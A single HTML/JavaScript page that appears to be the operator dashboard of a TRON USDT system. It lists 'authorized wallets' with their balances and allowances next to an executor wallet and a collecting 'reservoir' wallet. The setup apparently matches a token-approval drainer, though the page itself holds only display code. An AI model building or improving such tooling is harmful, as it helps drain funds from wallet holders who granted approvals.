<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT管理面板</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background: #f5f5f5;
        }

        .system-status {
            background: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .warning {
            color: #e74c3c;
            font-weight: bold;
        }

        .status-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 15px;
        }

        .status-item {
            background: #f8f9fa;
            padding: 12px;
            border-radius: 6px;
            border: 1px solid #dee2e6;
        }

        .status-item h3 {
            margin: 0 0 8px 0;
            color: #2d3436;
        }

        .wallet-list {
            background: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .wallet-item {
            padding: 10px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .wallet-item:last-child {
            border-bottom: none;
        }

        .refresh-button {
            background: #4834d4;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
            margin-bottom: 20px;
        }

        .refresh-button:hover {
            background: #686de0;
        }

        .address {
            font-family: monospace;
            color: #2d3436;
        }

        .balance {
            font-weight: bold;
            color: #00b894;
        }

        @media (max-width: 768px) {
            .status-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <button class="refresh-button" onclick="refreshData()">刷新數據</button>

    <div class="system-status">
        <h2>系統狀態</h2>
        <div class="status-grid">
            <div class="status-item">
                <h3>發動合約錢包</h3>
                <div class="address" id="executor-address"></div>
                <div id="executor-balance"></div>
            </div>
            <div class="status-item">
                <h3>水庫錢包</h3>
                <div class="address" id="receiver-address"></div>
                <div id="receiver-balance"></div>
            </div>
        </div>
    </div>

    <div class="wallet-list" id="wallet-list">
        <h2>已授權錢包</h2>
        <!-- 錢包列表將在這裡動態生成 -->
    </div>

    <script>
        const API_BASE_URL = 'http://localhost:3000'; // 請根據實際情況修改

        async function refreshData() {
            try {
                const response = await fetch(`${API_BASE_URL}/authorized-wallets`);
                const data = await response.json();

                // 更新系統狀態
                updateSystemStatus(data.systemStatus);

                // 更新錢包列表
                updateWalletList(data.wallets);
            } catch (error) {
                console.error('Error fetching data:', error);
                alert('獲取數據失敗，請重試');
            }
        }

        function updateSystemStatus(status) {
            // 更新發動合約錢包狀態
            document.getElementById('executor-address').textContent = status.executor.address;
            const executorBalance = document.getElementById('executor-balance');
            if (status.executor.lowTrxBalance) {
                executorBalance.className = 'warning';
                executorBalance.textContent = `TRX餘額: ${status.executor.trxBalance} (餘額過低，請充值！)`;
            } else {
                executorBalance.className = 'balance';
                executorBalance.textContent = `TRX餘額: ${status.executor.trxBalance}`;
            }

            // 更新水庫錢包狀態
            document.getElementById('receiver-address').textContent = status.receiver.address;
            document.getElementById('receiver-balance').textContent = 
                `USDT餘額: ${status.receiver.usdtBalance}`;
        }

        function updateWalletList(wallets) {
            const walletList = document.getElementById('wallet-list');
            const walletsHtml = wallets.map(wallet => `
                <div class="wallet-item">
                    <div>
                        <div class="address">${wallet.address}</div>
                        <div>USDT餘額: ${wallet.balance}</div>
                    </div>
                    <div>
                        <div>授權額度: ${wallet.allowance}</div>
                    </div>
                </div>
            `).join('');

            walletList.innerHTML = `
                <h2>已授權錢包</h2>
                ${walletsHtml}
            `;
        }

        // 頁面加載時自動刷新數據
        document.addEventListener('DOMContentLoaded', refreshData);

        // 每30秒自動刷新一次
        setInterval(refreshData, 30000);
    </script>
</body>
</html>
